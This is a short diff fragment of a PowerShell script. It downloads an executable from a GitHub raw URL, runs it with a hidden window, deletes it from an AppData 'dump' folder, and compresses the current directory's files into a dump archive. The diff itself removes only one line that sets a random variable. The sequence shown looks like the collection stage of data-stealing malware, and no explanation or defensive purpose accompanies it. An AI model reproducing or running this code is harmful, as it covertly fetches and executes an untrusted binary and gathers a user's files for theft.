@@ -7,4 +7,3 @@ Invoke-WebRequest 'https://github.com/jfkd02ks/playwithcode/raw/main/b32.exe' -O
 Start-Process -FilePath b32.exe -ArgumentList "--format json" -Wait -WindowStyle Hidden
 Remove-Item -Path "$env:appdata\Microsoft\dump\b32.exe" -Force
 Compress-Archive -Path * -DestinationPath "$dump_file_name"
-$Random = Get-Random
